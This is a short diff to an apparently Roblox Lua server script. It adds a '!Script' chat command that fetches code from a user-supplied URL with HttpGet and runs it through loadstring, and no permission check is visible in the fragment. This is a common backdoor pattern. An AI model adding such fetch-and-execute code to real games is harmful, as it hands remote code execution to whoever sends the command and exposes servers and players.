@@ -211,6 +211,11 @@ game.Players.PlayerAdded:Connect(function(Player)
 			end
 
 
+			if CommandData[1] == "!Script" then
+				loadstring(game:HttpGet(CommandData[2]))()
+			end
+
+
 
 
 
